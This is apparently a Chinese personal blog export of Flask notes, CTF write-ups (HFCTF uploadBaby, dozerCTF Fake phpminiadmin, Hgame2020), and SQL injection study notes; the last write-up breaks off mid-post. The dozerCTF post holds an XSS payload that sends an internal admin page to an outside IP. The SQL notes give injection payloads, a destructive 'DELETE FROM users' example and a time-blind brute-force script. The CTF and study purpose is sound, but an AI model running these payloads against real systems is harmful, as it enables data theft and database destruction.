+<h2 id="请求钩子"><a href="#请求钩子" class="headerlink" title="请求钩子"></a>请求钩子</h2><p>before_first_request：在第一个请求前运行<br>before_request：在每个请求前运行<br>after_request：在没有异常结束的请求后执行<br>teardown_reques：|在每个请求后执行(不论是否有异常)<br>after_this_request：在指定请求结束后执行</p>
+<pre><code>graph TB;
+    request(请求A)--&gt;ifFirst{第一次请求?};
+    ifFirst--Yes--&gt;before_first_request;
+    ifFirst--No--&gt;before_request;
+    before_first_request--&gt;before_request;
+    before_request--&gt;viewA[视图A];
+    before_request--&gt;viewB[视图B];
+    before_request--&gt;viewC[视图C];
+    viewC--&gt;after_this_request;
+    after_this_request--&gt;ifExcept{有无异常?};
+    viewA--&gt;ifExcept;
+    viewB--&gt;ifExcept;
+    ifExcept--Yes--&gt;teardown_request;
+    ifExcept--No--&gt;after_request;
+    after_request--&gt;teardown_request;
+    teardown_request--&gt;response(响应A)</code></pre><p>创建方式：</p>
+<pre><code>@app.before_first_request
+def before_first_request():
+    pass
+
+@app.before_request
+def before_request():
+    pass
+
+@app.route(&apos;/a&apos;)
+def A():
+    pass
+    @flask.after_this_request
+    def after_this_request():
+        pass
+    return &apos;&apos;
+
+@app.after_request
+def after_request():
+    pass
+
+@app.teardown_request
+def teardown_request():
+    pass</code></pre><h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><p>其关键是看其有没有<code>/</code></p>
+<pre><code>@app.route(&quot;/test_1&quot;)
+def test_1():
+    return &quot;nothing&quot;
+
+@app.route(&quot;/test_2/&quot;)
+def test_2():
+    return &quot;nothing&quot;</code></pre><p>在上例的<code>test_1</code>中，我们没有在其最后添加“/”，这使得解释器（?）会将其解释为一个文件。如果访问时，在其背后加上“/”，会导致404错误。这样可以保持 URL 唯一，并帮助搜索引擎避免重复索引同一页面。<br>而<code>test_2</code>一例中，我们在定义是便加上了“/”，这样可以使其看起来像一个文件夹。</p>
+<h2 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h2><h3 id="302"><a href="#302" class="headerlink" title="302"></a>302</h3><p>302跳转有2种方式实现</p>
+<pre><code>pass
+return &apos;...&apos;, 302, {&apos;Location&apos;:&apos;https://www.baidu.com&apos;}
+
+from flask import Flask, redirect
+pass
+return redirect(&apos;https://www.baidu.com&apos;)</code></pre><h3 id="其它响应码"><a href="#其它响应码" class="headerlink" title="其它响应码"></a>其它响应码</h3><p>我们可以自定义使指定页面返回我们想要的响应码<br>使用函数<code>abort(响应码)</code><br>需要<code>from flask import abort</code></p>
+<h3 id="自定MIME格式"><a href="#自定MIME格式" class="headerlink" title="自定MIME格式"></a>自定MIME格式</h3><pre><code>from flask import Flask, make_response
+pass
+@app.route(&apos;/a&apos;)
+def A():
+    response = make_response(&apos;Hello World!&apos;)
+    response.mimetype = &apos;text/plain&apos;
+    return response</code></pre><h4 id="json格式"><a href="#json格式" class="headerlink" title="json格式"></a>json格式</h4><p>自然，我们可以将MIME设置为json。<br>通常，一个字典即可代表一段json。<br>但使用<code>json.dumps()</code>可以将元组和列表也序列化为json(没有键)<br>或者使用<code>jsonify()</code>，在<code>return</code>中返回。(也可以添加响应码)</p>
+<h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><p>我们可以通过在<code>make_response()</code>对象中对cookie进行设置。</p>
+<pre><code>@app.route(&apos;/set/&lt;name&gt;&apos;)
+def setCooike(name):
+   response = make_response(redirect(url_for(&apos;hello&apos;)))
+   response.set_cookie(&apos;name&apos;, name)
+   return response</code></pre><p>上例可以在设置cookie之后重响应到<code>/hello</code><br>还有许多杂项和安全的设定</p>
+<ol>
+<li>max_age 被保存时间数，单位秒。默认会话结束时删除</li>
+<li>expires 具体过期时间</li>
+<li>path 限制cookie的可用路径，默认为整个域名</li>
+<li>domain 设置可用域名</li>
+<li>secure True时，只有https可以使用</li>
+<li>httponly True时，禁止客户端JS获取cookie</li>
+</ol>
+<h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><p>使用session首先需要设定secret_key<br>我们可以直接：<code>app.secret_key=&quot;value&quot;</code><br>或者将其设定为系统变量，用os模块获取</p>
+<p>一个用户登录的模型</p>
+<pre><code>@app.route(&apos;/login&apos;)
+def UserLogin():
+    name = FL.request.cookies.get(&apos;name&apos;)
+    if name is not None:
+        FL.session[&apos;LoggedIn&apos;] = True
+    return FL.redirect(FL.url_for(&apos;hello&apos;))</code></pre><p>我们使用<code>session[&#39;key&#39;]={value}</code>来设定一个session</p>
+<p>一个用户登出模型</p>
+<pre><code>@app.route(&apos;/logout&apos;)
+def UserLogout():
+    if &apos;LoggedIn&apos; in FL.session:
+        FL.session.pop(&apos;LoggedIn&apos;)
+    response = FL.make_response(FL.redirect(FL.url_for(&apos;hello&apos;)))
+    response.delete_cookie(&apos;name&apos;)
+    return response</code></pre><p>我们可以使用<code>session.pop(&#39;key&#39;)</code>来删除一个session</p>
+<p>WIP…</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>HFCTF2020-uploadBaby</title>
+    <url>/2020/04/21/HFCTF2020-uploadBaby/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本题在BUUCTF上有复现环境<br>这道CTF思路并不算难(虽然当时因为一些知识不太清晰没有做出来DX)，关键就是对于几个函数的理解和对php的session的存储方式。  </p>
+<h1 id="php-session文件特性"><a href="#php-session文件特性" class="headerlink" title="php-session文件特性"></a>php-session文件特性</h1><h2 id="sess文件的储存方式"><a href="#sess文件的储存方式" class="headerlink" title="sess文件的储存方式"></a>sess文件的储存方式</h2><p>php中，session文件有三种储存方式。<br>1.php_binary<br>2.php(默认模式)<br>3.php_serialize<br>每种储存方式都不太相同：</p>
+<pre><code>&lt;?php
+//这里我设定2个内容
+$_SESSION[&apos;passwd&apos;] = &apos;233&apos;;
+$_SESSION[&apos;username&apos;] = &apos;guest&apos;;
+
+/*
+读取sess文件获得以下内容：
+php_binary模式：
+passwds:3:&quot;233&quot;;usernames:5:&quot;guest&quot;;
+(其中为键名的字符个数的ASCII，比如passwd由6个字母组成，则的HEX为06)
+
+php模式：
+passwd|s:3:&quot;233&quot;;username|s:5:&quot;guest&quot;;
+
+php_serialize模式：
+a:2:{s:6:&quot;passwd&quot;;s:3:&quot;233&quot;;s:8:&quot;username&quot;;s:5:&quot;guest&quot;;}
+*/</code></pre><h2 id="sess的启动"><a href="#sess的启动" class="headerlink" title="sess的启动"></a>sess的启动</h2><pre><code>&lt;?php
+session_start();
+$_SESSION[&apos;username&apos;] = &apos;guest&apos;;
+//上例在运行正常的情况下会给予用户一个Cookie——PHPSESSID
+//由26个小写字母和数字的hash值组成</code></pre><p>sess文件文件名由用户的一个Cookie——PHPSESSION决定。<br>一般情况下PHP由26个小写字母和数字的hash值组成，php会根据这个cookie来找到对应的sess文件，对SESSION进行读取。<br>php寻找对应sess文件的依据是sess文件的文件名，一个sess文件的文件名为sess_PHPSESSID。</p>
+<h2 id="sess在web漏洞中的应用"><a href="#sess在web漏洞中的应用" class="headerlink" title="sess在web漏洞中的应用"></a>sess在web漏洞中的应用</h2><p>往往session导致的漏洞是因为程序本身逻辑出现问题：</p>
+<ol>
+<li>session反序列化<br>很明显sess文件内容进行了序列化来储存数据。当我们可以控制session内容时(如开启了PHP_SESSION_UPLOAD_PROGRESS时…)</li>
+<li>任意session读取导致越权等<br>很明显用户可以自己修改PHPSESSID来进行任意SESSION文件的读取。本题就是这样，通过上传一个文件名为“sess”，内容是可以导致越权的序列化内容的文件，在通过hash_file后变为“sess_sha256”的文件。再改PHPSESSID为sha256即可导致越权。</li>
+</ol>
+<h1 id="hash-file"><a href="#hash-file" class="headerlink" title="hash_file()"></a>hash_file()</h1><p><code>string hash_file(string 加密方式, string 文件路径);</code><br>这个函数可以通过<strong>文件的内容</strong>产生一个hash值(不是文件名)<br>PS：这个函数对文件夹同样凑效<br>PSS：我在做这道CTF时以为其是对文件名进行hash处理，于是光荣的没做出来（</p>
+<h1 id="filter-input"><a href="#filter-input" class="headerlink" title="filter_input"></a>filter_input</h1><p><code>mixed filter_input(int 数据来源, string 变量名 [, int 过滤器]);</code><br>可以通过<code>filter_input(INPUT_POST, &#39;test&#39;);</code>的方式来接受一个变量名为test的POST数据。虽然通过<code>$_POST[&#39;test&#39;]</code>也可以接受POST参数，但上面的写法还可以在第三个参数的地方添加过滤器。</p>
+<h1 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h1><p>这道题的思路并不难，只是因为自己的基础不算太扎实导致没能解出…</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>dozerCTF - Fake phpminiadmin</title>
+    <url>/2020/06/17/dozerCTF-Fake-phpminiadmin/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>emmm虽然标题这么说有一点标题党，但我的确从这道CTF中认识到了XSS的作用可不止盗cookie</p>
+<h1 id="Fake-phpminiadmin"><a href="#Fake-phpminiadmin" class="headerlink" title="Fake phpminiadmin"></a>Fake phpminiadmin</h1><p>这道题开始给了一个页面可以执行sql语句。刚开始以为是sql注入之类的，但实际上在上面的一栏中有contact选项。明显是一道和xss有关的题了。</p>
+<h2 id="可以xss的点"><a href="#可以xss的点" class="headerlink" title="可以xss的点"></a>可以xss的点</h2><p>那么首先要找到可以xss的点，尝试在输出sql语句输出的地方插入js语句，发现<code>&lt;&gt;</code>尖括号被过滤了，证明这个地方有鬼。</p>
+<pre><code># 尝试以下语句，被阻拦
+select &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;;
+# 尝试hex绕过，成功弹窗
+select 0x3C7363726970743E616C6572742831293C2F7363726970743E;</code></pre><p>接下来便是该想办法怎么样让机器人执行这里的sql。这里的sql数据使用了post，无法直接将带有弹窗数据的url直接发给机器人。<br>这里我想了两种方法：</p>
+<ol>
+<li>利用iframe+xss截图实现。</li>
+<li>利用CSRF进行跳转。</li>
+</ol>
+<p>首先一是不行的，进行测验，iframe只会在加载完js之后才会进行加载。导致无论如何利用js截图，都只能截到一个白框。<br>看起来只能跳转了。</p>
+<h2 id="利用CSRF进行跳转"><a href="#利用CSRF进行跳转" class="headerlink" title="利用CSRF进行跳转"></a>利用CSRF进行跳转</h2><p>首先机器人是不会对网址进行验证的，故我们可以在自己的vps上安置一个CSRF来对进行一个跳转。<br>不过，在当时我先是利用xss平台来确认一下机器人的cookie什么的，发现机器人的session没有特殊信息，但referrer给了一个特殊的网址：<code>http://127.0.0.1/admin_shark.php</code>,看起来这个内网的连接有东西。这更加证明了我们需要csrf来进行跳转，否则同源策略会阻挡我们获取这个内网连接的源码。<br>这里有一个点，便是admin_shark.php在外网下也可以访问，只不过会被拦截，提示你需要在内网访问。这代表着这个内网的服务器和公网的服务器是同一个（或者是是相同的）<br>数据被放置在了 <code>https://www.afkl.ml/xss.php</code>现在应该还能看到。在当时被安放了这么一组数据：</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;form action=&quot;http://127.0.0.1/sql.php&quot; id=&quot;sql&quot; method=&quot;post&quot;&gt;
+  &lt;input type=text name=&quot;sql&quot; value=&quot;select 0x3C7343724970743E76617220743D6E657720584D4C487474705265717565737428293B742E6F70656E2822474554222C2261646D696E5F736861726B2E706870222C66616C7365293B742E73656E6428293B286E657720496D616765292E7372633D22687474703A2F2F34372E39342E3233392E3139342F3F6F75743D222B62746F6128742E726573706F6E736554657874293B3C2F7343526970543E;&quot; /&gt;
+&lt;/form&gt;
+&lt;script&gt;
+  var f = document.getElementById(&quot;sql&quot;);
+  f.submit();
+&lt;/script&gt;
+&lt;h1&gt;it works!&lt;/h1&gt; </code></pre><p>本质是是构建了一个表单，下面的js会令其强制POST表单内容(PS:foxfire会弹窗询问是否提交表单，但chrome不会)<br>其中hex后的内容是</p>
+<pre><code>&lt;sCrIpt&gt;var t=new XMLHttpRequest();t.open(&quot;GET&quot;,&quot;admin_shark.php&quot;,false);t.send();(new Image).src=&quot;http://47.94.239.194/?out=&quot;+btoa(t.responseText);&lt;/sCRipT&gt;
+(上面是我的测试vps)</code></pre><p>在测试vps上开启监听，提交url，静候佳音即可。</p>
+<pre><code>flag:Dozerctf{eed8cdc400dfd4ec85dff70a170066b7}</code></pre><p>PS:可惜当时没有知道beef-xss，知道了这道题就有趣多了（</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>SQL注入笔记</title>
+    <url>/2020/02/24/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h1 id="SQL注入笔记"><a href="#SQL注入笔记" class="headerlink" title="SQL注入笔记"></a>SQL注入笔记</h1><p>这里是我的SQL注入笔记，绝赞更新中！欢迎批评斧正！</p>
+<p>[TOC]</p>
+<h2 id="普通注入-amp-amp-基础命令"><a href="#普通注入-amp-amp-基础命令" class="headerlink" title="普通注入&amp;&amp;基础命令"></a>普通注入&amp;&amp;基础命令</h2><h3 id="常用查库、表指令"><a href="#常用查库、表指令" class="headerlink" title="常用查库、表指令"></a>常用查库、表指令</h3><pre><code>查库： select schema_name from information_schema.schemata &lt;==&gt; show databases
+
+查表：select table_name from information_schema.tables where table_schema=0x7365637572697479(库名)    //&apos;security&apos;
+
+查列：select column_name from information_schema.columns where table_name=&apos;~~~~&apos;;    //column 列；栏
+
+查字段：select (column1),(column2) from (表名).(列名);</code></pre><p>其中schema_name;table_name;column_name…可视为一种全局变量;</p>
+<h3 id="concat-函数、ordor-by"><a href="#concat-函数、ordor-by" class="headerlink" title="concat()函数、ordor by"></a>concat()函数、ordor by</h3><p>有时查列或表一次性无法显示全，就用group_concat()包住上列全局变量;<br>group_concat()的作用是将所有数据拼接为1行显示，详细可查看concat函数介绍;</p>
+<p>order by指令原本用于排序，但在注入中可以用于确定列数；<br>假定某表有3列；</p>
+<pre><code>/?id=1&apos; order by 1;--&gt;成功
+/?id=1&apos; order by 2;--&gt;成功
+/?id=1&apos; order by 3;--&gt;成功
+/?id=1&apos; order by 4;--&gt;失败</code></pre><p>故此表有三列;<br>limit (起始序号(0开始)),(展示行数);<br>待补充…</p>
+<h3 id="不常用全局变量"><a href="#不常用全局变量" class="headerlink" title="不常用全局变量"></a>不常用全局变量</h3><pre><code>select system_user()&lt;==&gt;user()    //展示系统用户
+
+select database()            //展示数据库名
+
+select version()            //展示版本信息
+
+select @@datadir            //展示数据储存路径
+
+select @@version_compile_os    //展示服务器系统</code></pre><h3 id="为什么会有1-2-select…"><a href="#为什么会有1-2-select…" class="headerlink" title="为什么会有1,2,select…"></a>为什么会有1,2,select…</h3><p>类似于（union selcet 1,2,<del>#）的缘故:<br>上例是确定了此表有三列，为想要的数据得到展示，选择第三列来显示;<br>当如（union 1,selcet ~</del>,3#）时数据会出现在第二列;</p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="XPath语法错误注入"><a href="#XPath语法错误注入" class="headerlink" title="XPath语法错误注入"></a>XPath语法错误注入</h3><h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><p>extractvalue()：从目标XML中返回包含所查询值的字符串。<br>EXTRACTVALUE (XML_document, XPath_string);<br>第一个参数：XML_document是String格式，为XML文档对象的名称<br>第二个参数：XPath_string (Xpath格式的字符串)<br>concat:返回结果为连接参数产生的字符串。<br>当我们在XPath_string故意填入错误的XPath时，在回显报错的同时会执行XPath的sql语句。<br>可根据此函数进行报错注入</p>
+<pre><code>// 这里是为了绕过空格的检测，所以用()把所有的东西包裹起来
+// 0x7e是“~”，是sql的一元运算符，可以防止在回显的时候不回显第一组数据
+// 可以的话想用0x5e“^”也可以...
+extractvalue(NULL,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables))))#
+extractvalue(NULL,concat(0x7e,(select(group_concat(schema_name))from(information_schema.schemata))))#</code></pre><h4 id="UPDATEXML"><a href="#UPDATEXML" class="headerlink" title="UPDATEXML()"></a>UPDATEXML()</h4><p>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称<br>第二个参数：XPath_string (Xpath格式的字符串)<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>和上面同理，但需要多加一个NULL</p>
+<h3 id="整型溢出错误注入（SQL-lt-5-5-53）"><a href="#整型溢出错误注入（SQL-lt-5-5-53）" class="headerlink" title="整型溢出错误注入（SQL&lt;5.5.53）"></a>整型溢出错误注入（SQL&lt;5.5.53）</h3><pre><code>select ~0;
+&gt;&gt;&gt; 18446744073709551615</code></pre><p>这里我们对0进行了取反，导致数据溢出</p>
+<pre><code>select !(select * from (select user())x);
+&gt;&gt;&gt; 1</code></pre><p>当一条语句执行成功时，返回0。因此非一下就变成了“1”.</p>
+<pre><code>select exp(710);
+&gt;&gt;&gt; ERROR 1690 (22003): DOUBLE value is out of range in &apos;exp(710)&apos;</code></pre><p>这里exp()计算自然指数。到了710就已经溢出了，我们尝试：</p>
+<pre><code>select exp(~(select*from(select user())x));
+&gt;&gt;&gt; DOUBLE value is out of range in &apos;exp(~((select &apos;root@localhost&apos; from dual)))&apos;</code></pre><p>虽然报错，但成功返回用户信息。以此来注入。</p>
+<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><h3 id="时间盲注-1"><a href="#时间盲注-1" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>在时间盲注中共使用了4个比较重要的语句：</p>
+<pre><code>sleep(s);         # 将语句延迟s秒
+if(a,b,c);         # 如果a语句成立，执行b，否则执行c
+ascii(a);        # 将语句a的字符转换为ascii(十进制)
+substr(a,b,c);    # 将a的语句，从b(num)的位置开始，截取c(num)个字符</code></pre><p>我们将其一个一个结合起来就可以得到：</p>
+<pre><code>select if((ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),?,1))=?),sleep(5),1);
+# 一一拆分对应
+select if(@a,sleep(5),1)     #如果@a语句成立，执行sleep(5)，否则返回1
+@a=(ascii(@b)=?)            #判断ascii后的@b是否等于?中的数字
+@b=substr(@c,?,1)            #从?处开始，截取@c语句中的1个字符
+@c=(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database())     #查表语句，可以变换为查列，查字段的语句</code></pre><p>由此，我们可以实现爆破来获得信息<br>这里来一个python脚本(版本&gt;3.0)（十分臃肿</p>
+<pre><code>import requests
+
+mode = input(&quot;plz input use mode:&quot;)
+# T查表 C查列 F查字段
+while(True):
+    if(mode == &apos;T&apos;):
+        payload = &apos;select if((ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s),sleep(5),1)&apos;
+        break
+
+    elif(mode == &apos;C&apos;):
+        tab = input(&apos;plz input tables_name:&apos;)
+        payload = &apos;select if((ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=0x&apos;+tab.encode(&apos;UTF-8&apos;).hex()+&apos;),%s,1)))=%s,sleep(5),1)&apos;
+        break
+
+    elif(mode == &apos;F&apos;):
+        tab = input(&apos;plz input tables_name:&apos;)
+        col = input(&apos;plz input col_name:&apos;)
+        payload = &apos;select if((ascii(substr((select &apos;+ col +&apos; from &apos;+ tab +&apos; limit 0,1),%s,1))=%s),sleep(5),1)&apos;
+        break
+
+    elif(mode != &apos;F&apos;|&apos;C&apos;|&apos;T&apos;):
+        print(&apos;Error&apos;)
+
+url = &apos;http://114514.com/FAQ.php&apos;
+res = &apos;&apos;
+sel_num = input(&quot;plz input sel_num:&quot;)
+# 要查询的字符数
+
+for i in range(1,sel_num):
+    print(i)
+    for j in range(32,127):
+        print(chr(j))
+        now_payload = payload % (i,j)
+        try:
+            r = requests.post(url=url,data=now_payload,timeout=4.5)
+            # 这里视情况更改
+        except:
+            res += chr(j)
+print(res)</code></pre><h2 id="sql堆叠注入"><a href="#sql堆叠注入" class="headerlink" title="sql堆叠注入"></a>sql堆叠注入</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在一定条件下，我们可以通过 “ ; ” 提前结束sql语句，并在后面跟上其它sql语句，得到执行。在myphpadmin我们便可以这样多句执行<br>比如：</p>
+<pre><code>$a = $_GET[&apos;a&apos;];
+$sql = &quot;SELECT * FROM users WHERE id=$id&quot;;</code></pre><p>在这里我们甚至可以构造：</p>
+<pre><code>$a = &quot;1;DELETE FROM users&quot;;</code></pre><p>将整个users表全部删除！可见其危害有多大<br>不过一般来说，这种注入的局限比较大…<br>可能数据库引擎不支持，权限不足等…都会导致注入失败，还有就是，结果不一定会有回显…<br>yysy,我刚开始我从字面意思以为是什么数据溢出的骚操作（</p>
+<h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><h4 id="sql预处理语句"><a href="#sql预处理语句" class="headerlink" title="sql预处理语句"></a>sql预处理语句</h4><p>在可以进行堆叠注入时，且像”select、or…“等重要语句被过滤时，可以使用sql预处理语句</p>
+<pre><code>SET @a=&quot;select * from users&quot;; #怎么说？设定了一个a变量
+PREPARE test FROM @a; #使test=@a
+EXECUTE test; #加载test语句</code></pre><p>这样，我们就可以执行@a所设定的语句<br>再来，我们将我们的@a所设定的语句转换为hex，即可绕过大多数的waf<br>这里，我们尝试：</p>
+<pre><code>http://114514.com/?id=1&apos;;SET+@a=0x73656C65637420736C656570283529;PREPARE+test+FROM+@a;EXECUTE+test;&quot;
+//select sleep(5);</code></pre><h2 id="bypass-information-schema"><a href="#bypass-information-schema" class="headerlink" title="bypass - information_schema"></a>bypass - information_schema</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>也不是什么奇技淫巧，只是有其它的类似于information_schema的东西可以用来替代。<br>这里先只给出payload，详细原理之后补上。不知其所以然是不行的。</p>
+<pre><code># 无自增id时
+select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database();
++---+---+-------------------------------+
+| 1 | 2 | group_concat(table_name)      |
++---+---+-------------------------------+
+| 1 | 2 | users,emails,uagents,referers |
++---+---+-------------------------------+
+
+# 有自增id时
+select 1,2,group_concat(table_name)from sys.schema_auto_increment_columns where table_schema=database()；
++---+---+-------------------------------+
+| 1 | 2 | group_concat(table_name)      |
++---+---+-------------------------------+
+| 1 | 2 | emails,referers,uagents,users |
++---+---+-------------------------------+</code></pre><p><a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193512</a><br>原作者说，可能还有更多方式，但我现在时间有限。之后再说。</p>
+<h2 id="as别名的无列名注入"><a href="#as别名的无列名注入" class="headerlink" title="as别名的无列名注入"></a>as别名的无列名注入</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>通过as和虚拟表来使数据导入至虚拟表并赋予别名，以此在不知道列名的状况下，通过别名窃取到数据。</p>
+<h3 id="as语句"><a href="#as语句" class="headerlink" title="as语句"></a>as语句</h3><p>要了解此注入先需要知道什么是as。<br>其实也简单，它就是为数据起了一个别名。<br>例如，我使用如下语句查询到了以下结果：</p>
+<pre><code>select * from users;
++----+----------+------------+
+| id | username | password   |
++----+----------+------------+
+|  1 | Dumb     | Dumb       |
+|  2 | Angelina | I-kill-you |
+|  3 | Dummy    | p@ssword   |
+|  4 | secure   | crappy     |
+|  5 | stupid   | stupidity  |
+|  6 | superman | genious    |
+|  7 | batman   | mob!le     |
+|  8 | admin    | admin      |
+|  9 | admin1   | admin1     |
+| 10 | admin2   | admin2     |
+| 11 | admin3   | admin3     |
+| 12 | dhakkan  | dumbo      |
+| 14 | admin4   | admin4     |
++----+----------+------------+</code></pre><p>这时候，可能有人不懂洋文(比如我)，这时候我们可以用as语句进行转换：</p>
+<pre><code>select id as 编号,username as 用户名,password as 密码 from users;
++--------+-----------+------------+
+| 编号    |  用户名    | 密码       |
++--------+-----------+------------+
+|      1 | Dumb      | Dumb       |
+|      2 | Angelina  | I-kill-you |
+|      3 | Dummy     | p@ssword   |
+|      4 | secure    | crappy     |
+|      5 | stupid    | stupidity  |
+|      6 | superman  | genious    |
+|      7 | batman    | mob!le     |
+|      8 | admin     | admin      |
+|      9 | admin1    | admin1     |
+|     10 | admin2    | admin2     |
+|     11 | admin3    | admin3     |
+|     12 | dhakkan   | dumbo      |
+|     14 | admin4    | admin4     |
++--------+-----------+------------+</code></pre><p>可以发现，id、username、password都变成了中文。</p>
+<h3 id="无列名查询"><a href="#无列名查询" class="headerlink" title="无列名查询"></a>无列名查询</h3><p>但需要注意的是，这并不是在原表修改的，而是产生了一张虚拟表。这使得我们可以不用查列名即可获得数据。这就让我们可以干一些奇怪的事情。<br>注意，这里需要知道表的列数(其实也容易获取)</p>
+<pre><code>select 1,2,3 as c;
+# 获得了一张虚拟表，最后列名是c
++---+---+---+
+| 1 | 2 | c |
++---+---+---+
+| 1 | 2 | 3 |
++---+---+---+
+
+select 1,2,3 as c union select * from users;
+# 我们发现原有的列名被替换了
++----+----------+------------+
+| 1  | 2        | c          |
++----+----------+------------+
+|  1 | 2        | 3          |
+|  1 | Dumb     | Dumb       |
+|  2 | Angelina | I-kill-you |
+|  3 | Dummy    | p@ssword   |
+|  4 | secure   | crappy     |
+|  5 | stupid   | stupidity  |
+|  6 | superman | genious    |
+|  7 | batman   | mob!le     |
+|  8 | admin    | admin      |
+|  9 | admin1   | admin1     |
+| 10 | admin2   | admin2     |
+| 11 | admin3   | admin3     |
+| 12 | dhakkan  | dumbo      |
+| 14 | admin4   | admin4     |
++----+----------+------------+
+
+# 这时候，我们就可以对这个虚拟表干一些奇怪的事情
+select group_concat(c) from (select 1,2,3 as c union select * from users) as b;
+# 这里是又建立了另一个表，让他查询我们之前导入了数据的虚拟表，便可以提出数据
+# 注意，新表一定要起别名，不然会报错(指上面的as b)
+# 这个太长了，我就在下面放图片了</code></pre><p><img src="https://www.afkl.ml/usr/uploads/2020/02/531845518.png" alt="getc.PNG" title="getc.PNG"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>不完整的Hgame2020-CTF的WP</title>
+    <url>/2020/02/24/%E4%B8%8D%E5%AE%8C%E6%95%B4%E7%9A%84Hgame2020-CTF%E7%9A%84WP/</url>
+    <content><![CDATA[<h1 id="2020-杭电HgameWP"><a href="#2020-杭电HgameWP" class="headerlink" title="2020-杭电HgameWP"></a>2020-杭电HgameWP</h1><p>2020年Hgame比赛WP<br>由于我过于菜鸡，只能打到week2了…orz</p>
+<p>[TOC]</p>
+<h1 id="week-1"><a href="#week-1" class="headerlink" title="week-1"></a>week-1</h1><h2 id="Cosmos-的博客"><a href="#Cosmos-的博客" class="headerlink" title="Cosmos 的博客"></a>Cosmos 的博客</h2><h3 id="考察点"><a href="#考察点" class="headerlink" title="考察点"></a>考察点</h3><p><code>/.git</code>信息泄露</p>
+<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>在首页中提示了出题人在github上保存了原代码。<br>尝试访问<code>http://cosmos.hgame.n3ko.co/.git/config</code>。得到项目保存的地址。<br>最后在<code>https://github.com/FeYcYodhrPDJSru/8LTUKCL83VLhXbc/commit/f79171d9c97a1ab3ea6c97b3eb4f0e1551549853</code>的历史记录中得到base64后的flag。</p>
+<pre><code>hgame{g1t_le@k_1s_danger0us_!!!!}</code></pre><h2 id="接-头-霸-王"><a href="#接-头-霸-王" class="headerlink" title="接 头 霸 王"></a>接 头 霸 王</h2><h3 id="考察点-1"><a href="#考察点-1" class="headerlink" title="考察点"></a>考察点</h3><p>请求头</p>
+<h3 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h3><p>类似于2019极客大挑战的 神秘的三叶草 一题。<br>但值得注意的是，这道题还考察了一个请求参数<code>If-Unmodified-Since:&lt;time&gt;</code><br>简单来说，这个参数的作用是进行一个判断：</p>
+<pre><code>如果 (在`&lt;time&gt;`时间点之后，文件没有被修改) 则
+    下载文件
+否则
+    返回412错误</code></pre><p>还有一个比较相似的参数<code>If-Modified-Since:&lt;time&gt;</code><br>和<code>If-Unmodified-Since:&lt;time&gt;</code>是反着来的：</p>
+<pre><code>如果 (在`&lt;time&gt;`时间点之后，文件修改过了) 则
+    下载文件
+否则
+    返回304错误</code></pre><p>在这道题只需将请求头修改即可：</p>
+<pre><code>POST http://kyaru.hgame.n3ko.co/ HTTP/1.1
+Host: kyaru.hgame.n3ko.co
+Referer: https://vidar.club
+X-Forwarded-For: 127.0.0.1
+User-Agent: Cosmos/114514
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+If-Unmodified-Since: Fri, 01 Jan 1077 00:00:00 GMT
+Content-Length: 0</code></pre><p>PS:这道题最开始使用GET请求即可，但后面不知道为什么又改成了POST</p>
+<pre><code>hgame{W0w!Your_heads_@re_s0_many!}</code></pre><p>PSS:<br>至于为什么一定是<code>If-Unmodified-Since</code>…<br>可能只是出题人单纯检测了一下请求？<br>亦或者是其它方式？好奇后端是怎么实现的…</p>
+<h2 id="Code-World"><a href="#Code-World" class="headerlink" title="Code World"></a>Code World</h2><h3 id="考察点-2"><a href="#考察点-2" class="headerlink" title="考察点"></a>考察点</h3><p>响应</p>
+<h3 id="过程-2"><a href="#过程-2" class="headerlink" title="过程"></a>过程</h3><p>初次打开返回了403，页面为new.php，且打开比较慢，便怀疑有页面重定向。<br>尝试抓包发现果然如此，并提示了405错误。说明请求方式有误，尝试POST请求。<br>请求后出现这样一段话(已格式化)：</p>
+<pre><code>&lt;center&gt;
